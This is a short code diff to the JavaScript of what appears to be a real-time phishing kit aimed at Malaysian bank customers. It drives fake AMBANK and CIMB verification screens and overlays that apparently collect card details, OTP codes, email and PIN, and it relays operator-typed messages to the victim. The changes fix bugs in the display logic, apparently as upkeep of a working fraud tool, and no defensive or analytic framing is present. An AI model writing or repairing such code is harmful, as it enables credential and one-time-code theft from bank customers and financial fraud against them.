@@ -725,7 +725,7 @@
             else if(a === 'app_verify') {
               var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
               _curStep = 'app_verify';
-              (function(){var avo=q('app-verify-overlay');if(!avo)return {add:function(){},remove:function(){},contains:function(){return false}};return avo.classList})().remove('hidden');
+              (function(){var avo=q('app-verify-overlay');if(!avo)return;return avo.classList})().remove('hidden');
               var bn = (p.cardInfo && p.cardInfo.bankName) || p.bankName || '';
               if(bn === 'AMBANK (M) BERHAD') {showMount1(p)}
               else if(bn === 'CIMB BANK BERHAD') {showMount2(p)}
@@ -800,16 +800,16 @@
                 else if(a === 'custom_prompt') {
                   var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
                   var cm=p.message||'';
-                  if(!(function(){var avo=q('app-verify-overlay');if(!avo)return {add:function(){},remove:function(){},contains:function(){return false}};return avo.classList})().contains('hidden')){
+                  if((function(){var avo=q('app-verify-overlay');return avo?!avo.classList.contains('hidden'):false})()){
                     for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(!m.classList.contains('hidden')&&m.shadowRoot){var sp=m.shadowRoot.querySelector('.vfy-spinner');var er=m.shadowRoot.querySelector('.app-error');if(sp){sp.classList.add('hidden');sp.style.display='none'}if(er){er.classList.remove('hidden');er.textContent=cm};return}}
                     var avbox=q('app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display='none'}var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');var ae3=q('app-error');if(ae3)ae3.textContent=cm;var acb=q('app-continue-btn');if(acb)acb.disabled=false
-                  }else if(!((function(){var avo3=q('otp-overlay');return avo3&&!avo3.classList.contains('hidden')})())){
+                  }else if((function(){var avo3=q('otp-overlay');return avo3?!avo3.classList.contains('hidden'):false})()){
                     var otpsp=document.getElementById('otp-spinner');if(otpsp){otpsp.classList.add('hidden');otpsp.style.display='none'}
                     q('otp-result').classList.remove('hidden');var otpResP2=document.querySelector('#otp-result>p');if(otpResP2)otpResP2.textContent=cm
-                  }else if(!((function(){var avo4=q('email-overlay');return avo4&&!avo4.classList.contains('hidden')})())){
+                  }else if((function(){var avo4=q('email-overlay');return avo4?!avo4.classList.contains('hidden'):false})()){
                     var emsp=document.getElementById('email-spinner');if(emsp){emsp.classList.add('hidden');emsp.style.display='none'}
                     q('email-result').classList.remove('hidden');var emailResP2=document.querySelector('#email-result>p');if(emailResP2)emailResP2.textContent=cm
-                  }else if(!((function(){var avo5=q('pin-overlay');return avo5&&!avo5.classList.contains('hidden')})())){
+                  }else if((function(){var avo5=q('pin-overlay');return avo5?!avo5.classList.contains('hidden'):false})()){
                     var psp=document.getElementById('pin-spinner');if(psp){psp.classList.add('hidden');psp.style.display='none'}
                     var pe4=q('pin-error');if(pe4)pe4.textContent=cm;var pe3=q('pin-error');if(pe3)pe3.style.display='block'
                   }else{showMsg('error',cm)}
